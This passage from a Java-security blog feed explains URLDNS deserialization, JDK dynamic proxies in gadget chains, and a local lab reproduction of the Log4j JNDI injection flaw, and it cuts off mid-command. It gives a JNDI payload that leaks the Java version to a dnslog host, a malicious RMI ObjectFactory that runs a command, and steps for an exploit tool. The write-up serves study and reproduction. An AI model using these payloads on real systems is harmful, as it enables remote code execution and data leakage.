class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>反序列化具体代码分析：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">                @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, false, false);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>对传入的内容进行反序列化，获得到key、value，然后对key传入hash方法。 接下来再看一下hash方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">        int h;</span><br><span class="line">        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果key不为空，则进行hashCode方法，而我们在前面提到url类的hashCode方法是可以发起url请求对。现在需要做的就是我们需要将一个内容传送给hashcode方法，对该内容反序列护化获取key、value。然后对key调用hascode方法，如果key是url对象，url对象的hashcode方法可以发起url请求（要用到反射的知识，在代码运行的时候动态的修改类的属性值，把hashcode改为-1）</p><p><strong>整体流程：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 将URL对象作为key放入hashMap中，将其序列化发送给目标机器</span><br><span class="line">2. 如果目标机器存在反序列化漏洞，那么会执行 HashMap.readObject() 将数据反序列化</span><br><span class="line">3. 在反序列化期间，为了还原hashmap的内容，会调用 hash() 方法，而 hash() 函数会调用传入参数的 hashCode() 方法</span><br><span class="line">4. 当URL对象的 hashCode 属性值为-1时会调用 handler.hashCode() 方法，而这个方法会进行一次DNS查询</span><br></pre></td></tr></table></figure><p>反序列化后收到解析记录</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230308154309992.png" alt="image-20230308154309992"></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230308154223607.png" alt="image-20230308154223607" style="zoom:43%;" /><p>Burp插件，拥有类似dnslog功能</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226112937233.png" alt="image-20230226112937233" style="zoom: 40%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;序列化和反序列化&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230225103722699.png&quot; alt=&quot;im</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="URLDNS" scheme="https://micgo.top/tags/URLDNS/"/>
    
  </entry>
  
  <entry>
    <title>JDK动态代理</title>
    <link href="https://micgo.top/java-security/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>https://micgo.top/java-security/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2023-03-04T16:00:00.000Z</published>
    <updated>2023-03-10T00:24:26.618Z</updated>
    
    <content type="html"><![CDATA[<h4 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h4><p>代理模式是一种设计模式，能够使得在不修改源目标的前提下，额外扩展源目标的功能。即通过访问源目标的代理类，再由代理类去访问源目标。这样一来，要扩展功能，就无需修改源目标的代码了，只需要在代理类上增加就可以了</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230309112558148.png" alt="image-20230309112558148" style="zoom:67%;" /><p>一个最简单的动态代理实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning, &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">            Hello.class.getClassLoader(), <span class="comment">// 传入ClassLoader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Hello.class &#125;, <span class="comment">// 传入要实现的接口</span></span><br><span class="line">            handler); <span class="comment">// 传入处理调用方法的InvocationHandler</span></span><br><span class="line">        hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行期动态创建一个<code>interface</code>实例的方法如下：</p><ol><li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用</li><li>通过 Proxy.newProxyInstance() 创建 interface 实例，它需要3个参数：<ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code></li><li>需要实现的接口数组，至少需要传入一个接口进去</li><li>用来处理接口方法调用的<code>InvocationHandler</code>实例</li></ol></li><li>将返回的<code>Object</code>强制转型为接口</li></ol><p>动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，它并没有什么黑魔法，把上面的动态代理改写为静态实现类大概长这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class HelloDynamicProxy implements Hello &#123;</span><br><span class="line">    InvocationHandler handler;</span><br><span class="line">    public HelloDynamicProxy(InvocationHandler handler) &#123;</span><br><span class="line">        this.handler = handler;</span><br><span class="line">    &#125;</span><br><span class="line">    public void morning(String name) &#123;</span><br><span class="line">        handler.invoke(</span><br><span class="line">           this,</span><br><span class="line">           Hello.class.getMethod(&quot;morning&quot;, String.class),</span><br><span class="line">           new Object[] &#123; name &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是JVM帮我们自动编写了一个上述类（不需要源码，可以直接生成字节码），并不存在可以直接实例化接口的黑魔法</p><p><strong>小结</strong></p><p>Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例</p><p>动态代理是通过<code>Proxy</code>创建代理对象，然后将接口方法“代理”给<code>InvocationHandler</code>完成的相对于静态代理类来说，无论有多少接口，动态代理只需要一个代理类</p><p><strong>动态代理意义</strong>： 少修改代码  适配强<br><strong>在反序列化漏洞中的作用</strong>：</p><p>1、readObject -&gt; 反序列化自动执行  2、invoke -&gt; 有函数调用    3、拼接两条链    4、任意-&gt;固定</p><p>要利用反序列化的漏洞是需要一个入口类的，先假设存在一个能够漏洞利用的类为 <code>B.f</code> ，比如<code>Runtime.exec</code>这种，我们将入口类定义为<code>A</code>，我们最理想的情况是 A[O] -&gt; O.f ，那么我们将传进去的参数 <code>O </code>替换为 <code>B</code> 即可。但是在实战的情况下这种情况是极少的</p><p>回到实战情况，比如我们的入口类<code>A</code>存在  <code>O.abc</code>这个方法，也就是 A[O] -&gt; O.abc</p><p>如果O 是一个动态代理类，O 的<code>invoke</code>方法里存在 <code>.f </code>的方法，便可以漏洞利用了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A[O] -&gt; O.abc</span><br><span class="line">O[O2] invoke -&gt; O2.f // 此时将 B 去替换 O2</span><br><span class="line">最后  ----&gt;   O[B] invoke -&gt; B.f // 达到漏洞利用效果</span><br></pre></td></tr></table></figure><p>动态代理在反序列化当中的利用和<code>readObject</code>是异曲同工的：</p><p><code>readObject</code>方法在反序列化当中会被自动执行，而<code>invoke</code>方法在动态代理当中会自动执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;JDK动态代理&quot;&gt;&lt;a href=&quot;#JDK动态代理&quot; class=&quot;headerlink&quot; title=&quot;JDK动态代理&quot;&gt;&lt;/a&gt;JDK动态代理&lt;/h4&gt;&lt;p&gt;代理模式是一种设计模式，能够使得在不修改源目标的前提下，额外扩展源目标的功能。即通过访问源目标的代理</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="动态代理" scheme="https://micgo.top/tags/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>加密文章</title>
    <link href="https://micgo.top/uncategorized/%E5%8A%A0%E5%AF%86%E6%96%87%E7%AB%A0/"/>
    <id>https://micgo.top/uncategorized/%E5%8A%A0%E5%AF%86%E6%96%87%E7%AB%A0/</id>
    <published>2023-02-28T16:00:00.000Z</published>
    <updated>2023-03-08T09:07:02.436Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dfdf5695317f1103b3e782a6b50b70050888afafbcd4c6ddb8dd064aaece753f">04dcc9f4ed3dc94a2f5aca30f556a6630307a56c22e4cb85bce127aee18f989ea4aac793681c9a6cfa2c62b3ca4c9a331db8ce8663631123ea4b13c3d29030295b51a5f5deca6aacce87079f5bf1c9d764e2a9d909a15880990d0e206c3eb36050c51ff1448466156563904ab02ec61ece8f70f9924c5f15f985a5ca94729a2c3b17d2d7b432dc15be9fc4d281a52d5f24dd8817ccd0a3fead9cdc1717fe033cc41c0fdc200a83a59f53cbb0eb561348de6a4024fd477c2e575cda8b7b349c32435de0cc734462d688d7aa650372a6f5062a779ab4fce4b7b337eba43363cd9392c62d493e633e2c5fb8943a9a04e0c308179c51f8fcd77b400aba34284262c5d0ba54b21ca1a1c7ecccf885cfc8ae951abff79cfaa2635f07b33cd71dbfff820a45f49c50224714f81c68032799aef5b6e0047a05b0a2edb51e459c5cb51b5c2ba645a920d9d648bb21a0e3646a06d6bb7ea77905cd07760170beeb94fc4aac186708c216dbadf1eb7ddbaa3d1dcd14dc42b87549a24113c6e6abf198fb668191b35542175a833e67c4df8ae89dd967b00ddda1b2395d20fb4f6c3431338d21c2640d0aab4d8f2fd778a0738086d51db14c658321f5cbc77da15ba090f7fcf2071a1f976f92f85dd0673f7b25e379067cae46906945f0d746874ced6918ba0ea192ccbd61d17f66fca1f5fa5d8c68885e9266ad476ca2fef3028057b901272be552451956d46935688463517cacbc789275eb860a552404074f163a91f777df7e97a0cb2ce0fcb2420c53cae752ee3bbfec5926dc9665fc94c9f034990355c44ddecb99721c4723389bdd85ac1aa6efe7bc81eab7628f8d048f7bfbb1b1aee147d18fb1d26c12b225494f53cd3700170aa2efd02670334f6f20f3779873d1a022eaae3a4c84699e546f7c1a5d8ad8defeaf1b777d4cd4bfc5a13cac9b0aac39af140f3237381fb3d0ddea781228958b54b64684ac4f0457ab60d25d0a085b316fae42f5ec23bb0f3dbc78d5532c1109cea5bea57af349b53e38df707cf8d27e1329b25fed1a0f1c09d6b4b26df4e78fb30a2c7275b5bb710e0c57e2993942f9e58d1f7949a46c8150e4900817bf72a7a3eb8593f2f14723c0e362a7e55935433eaa1bad395e1035a8970942c27c37a199236e67229adac5578ac084ccae4747d40e5a17c6849f924339dbfc71b609d731327fd0caec9fb56c70e233dbbde1f379f606b3913a080f4b6e94a47b55357f8c485ff643d9b0199149c96724471aeb9318169006b462a8bddf8cae75cc6c89219b6ec00f7539f189b2dc0dd99c21623806c7e63e2a20016b0d76cc3d780ea844a5c93219893fc3d87fda4e41cc806f6317ba72e50fb253a6aad3daf47637509b2405b2315e1df0e3d04625a52137f130774d78d4d958070059f58ba1eb805f08675913ee0c41a56f066639de14cee108f5030211388cb9276646ebb994de266d2dd6e9b0127771738ec35eeeff52526bd7b9c1f1d50b3a31657383930d1725ef25d4d1db2eafd17c3bbd81587c0c13d06e527cde5678b19d16cc97f87a37b6d55e7a7b76c9a8a9d089c7eed0029375557ba2fbd64a9b9e380066a251df7baf3b727f324a6b41435f51c8da1d07a848f9ae63c73624cbbd85e080ac438b26a802b84b1beddeb294639cfbabe19ced6d84eb7a0a31266a16dd83ff282313cd79bb61698eabbe1a77cb7cb5ab1b40c7a7d7a00d05ba1e4fb8a7685286dc23e409bd7fc27acdff7bad84b61e11e2abdda5021e3b2631254a8945f70179e59705af3b8cbb7ae8249e7dcfa99ff8fec942866c33b9b6fb1c93ed2de250323a8d38ceb1b71f1e9329dabecfd2c67ff8362f6c27df95a81575de138e0bd8c37a8fe7270aeea65af67376476aef06a0447386e4aef0dde18e271ad2d0a222a427206e532eb49dee7eeedbbf4d185bc554e88fff7155b072f5599d157fb936671a683b4c6eb6df8b4b084d9b117605a2f8fc090f96c741952483f659b2a99ca3b7066815311c60bb94c76ad1d37a87d44e00f5333f52190f266c03b69e77e466faa795274751fdb7b2986afaf5f331537df18b37e4472383578acadabcb99ebe7eaa985eed327872f541451e1703395e9047c7afc86d20e55f8697f291f999a2558647e385a2b45d5a688105dc6ae3d63215110a04981b40326dc6795b6c7ed57ce336851a5a9b5b948ed864d97dbb2c76901d3e5c7f10432a896fe5395fdc6c443e749d2491fd8879493b0a9c8ee59c545cfc0c27285d7353bfd2e6926605a432eb85eeadf4b63d64ab8adb58a6263b84b409ac3b062e48eccc4395e4de978fbc508b3a598f4c415a29ce5e9a101485e1113b4b73b973b9b268f5cede0e547ce067ca74197e5f4abaab789d3b60fb7533ef828e158e75e88e3772cde70c79561073d57b96de3e878084191a66b4f681144c84de13723977a03677859e4b806da257df867426783dbbd5231d48af40a4a09b8658b8f87a1ec12ae424f5ebcbbfe64831fe1269b4639479b197c4a5a77c763fb27758603b947d3ce515a3f14234f77458cee220a5c10c5534d7cd14348c8af8aa3da17989efde68b7829d7ef3e1786092f6f228ee7a80043bbabf9d19eb4ea5f57eb417998a7e09929a0fbc1e284b3f8b7c8789970c9cff86faf7239b5af16c136493933585a733c56a9889190272a7db7d0bd58ba5c0f93bfa00125617d91c524e8fd8d4f9c4b069abdcab5dfb0f4b99132af40af5ab43483763c0c6f520609adc874ecf46902a617aeab2e7a452b4c6f0f4128b5adb37635673bd4336bdcddae3e3a1c7d3304d421a34afda54ecd0f0bfc91fca33a5dbdd0259fcb3e5a221599fbc8cb4164c636b2b5329121665aa4df5b87d9fd6a154c9eb552e5aa2bfe27e86be445db4bf6c32d2740e1b2fed24717f7a540940d82f1cafc2b2e45103ab3be5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Log4j漏洞分析</title>
    <link href="https://micgo.top/java-security/log4j/"/>
    <id>https://micgo.top/java-security/log4j/</id>
    <published>2023-02-26T16:00:00.000Z</published>
    <updated>2023-02-27T05:15:22.045Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Log4j的lookup功能——本次漏洞是因为Log4j2组件中 lookup功能的实现类 <code>JndiLookup</code> 的设计缺陷导致，这个类存在于<code>log4j-core-xxx.jar</code>中</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223135531795.png" alt="image-20230223135531795" style="zoom: 30%;" /><p>在使用RMI之前，我们需要把被调用的类，注册到一个叫做RMI Registry的地方，只有把类注册到这个地方，调用者就能通过RMI Registry找到类所在 JVM 的 ip 和 port，才能跨越JVM完成远程方法的调用</p><p>调用者，我们称之为客户端，被调用者，我们则称之为服务端</p><p>RMI Registry，我们又叫它为RMI注册中心，它是一个独立的服务，但是，它又可以与服务端存在于同一个JVM内，而RMI Registry服务的创建非常的简单，仅需 <code>LocateRegistry.createRegistry(12345);</code> 一行代码即可完成</p><p>在服务器启动的时候，就启动了一个RMI的注册中心，接着把main主类暴露并注册到RMI注册中心，其中存储着主类的stub数据，包含有其所在服务器的ip和port。在客户端启动之后，通过连接RMI注册中心，并从其中根据名称查询到了对应的对象（JNDI），并把其数据下载到本地，然后RMI会根据stub存储的信息，也就是服务端中main实现暴露的ip和port，最后发起RMI请求，RMI后，服务端把序列化数据返回给客户端，客户端对其反序列化后输出</p><p>根据上述所说的流程，我们可以发现，如果要发起一个反序列化攻击，那么早在客户端 lookup的时候，就会从Registry注册中心下载数据，前面也说了“服务名称和对象或命名引用相关联”，我们就可以通过服务器 bind注册一个命名引用到Registry注册中心，也就是Reference，它具有三个参数，className、factory、classFactoryLocation，当客户端 lookup它并下载到本地后，会使用Reference的classFactoryLocation指定的地址去下载className指定class文件，接着加载并实例化，从而在客户端lookup的时候实现加载远程恶意class实现RCE</p><h4 id="搭建复现环境"><a href="#搭建复现环境" class="headerlink" title="搭建复现环境"></a>搭建复现环境</h4><p>新建maven项目，引入依赖（客户端）</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223144438403.png" alt="image-20230223144438403"></p><p>编写一个最简单的测试类， demo：</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223145757704.png" alt="image-20230223145757704" style="zoom:45%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><h4 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a><strong>rmi服务端</strong></h4><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230224094009604.png" alt="image-20230224094009604"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">12345</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referencewrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;obj&quot;</span>,referencewrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230224093852137.png" alt="image-20230224093852137"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rmi客户端"><a href="#rmi客户端" class="headerlink" title="rmi客户端"></a>rmi客户端</h4><p>若版本高于8u221，要加上这两句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</span><br><span class="line">System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230224094901301.png" alt="image-20230224094901301"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:12345/obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230224094938506.png" alt="image-20230224094938506"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Logger logger=LogManager.getLogger();</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.ldap.jndi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.ldap.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;rmi://127.0.0.1:12345/obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h4><p>编译 Hello.java 为 .class文件（记得系统环境变量里的java版本要对应！踩坑了找了好久是什么问题），同时开启web服务（用idea里的tomcat或者python都可以）</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230224093336109.png" alt="image-20230224093336109"></p><p>成功执行</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230224093423590.png" alt="image-20230224093423590" style="zoom:45%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230224094800175.png" alt="image-20230224094800175" style="zoom:48%;" /><h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/welk1n/JNDI-Injection-Exploit.git</span><br><span class="line">cd JNDI-Injection-Exploit</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>接下来就会生成一个  .jar文件</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230225084329496.png" alt="image-20230225084329496" style="zoom: 33%;" /><p>接着利用工具开启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c 